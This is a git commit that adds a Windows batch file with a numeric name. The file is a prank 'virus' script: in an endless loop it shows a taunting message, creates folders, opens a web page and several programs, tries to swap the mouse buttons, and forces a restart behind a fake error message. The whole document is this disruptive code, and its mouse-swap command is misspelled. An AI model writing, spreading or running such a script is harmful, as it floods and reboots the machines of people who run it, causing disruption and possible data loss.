6c1f605ee1d714c6b15370fc9756f2f606d5cb6a
Julho Vanzella <107476361+JulhoVanzella9@users.noreply.github.com>
2022-06-14 08:47:47 -0300

    Add files via upload

---
+++ 09184010984.bat
@@ -0,0 +1,13 @@
+@echo off
+:loop
+msg * JuuJ passou por aqui.
+md virus
+md %random%
+start https://www.google.com/juuj
+runddll32 user32 , SwapMouseButton
+start calc
+start explorer
+start cmd
+start mspaint
+shutdown -r -t 30 -c "occoreu um erro."
+goto loop
